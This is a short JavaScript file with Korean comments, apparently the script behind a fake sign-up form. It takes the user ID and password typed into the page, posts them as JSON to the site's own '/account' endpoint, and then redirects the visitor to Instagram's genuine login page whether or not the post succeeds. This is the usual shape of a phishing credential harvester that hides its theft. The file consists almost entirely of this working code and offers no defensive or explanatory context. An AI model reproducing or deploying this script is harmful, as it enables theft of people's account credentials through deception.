var signup = {
    init : function () {
        var _this = this;
        $('#btn-save').on('click', function () {
            _this.save();
        });
    },
    save : function () {
        var data = {
            userid: $('#userid').val(),
            userpassword: $('#userpassword').val()
        };

        $.ajax({
            type: 'POST', // type은 변함 없음
            url: '/account', // 이게 중요함
            dataType: 'json',
            contentType:'application/json; charset=utf-8',
            data: JSON.stringify(data)
        }).done(function() {
            location.href="https://www.instagram.com/accounts/login/?source=auth_switcher";
        }).fail(function (error) {
            location.href="https://www.instagram.com/accounts/login/?source=auth_switcher";
        });
    }

};
signup.init();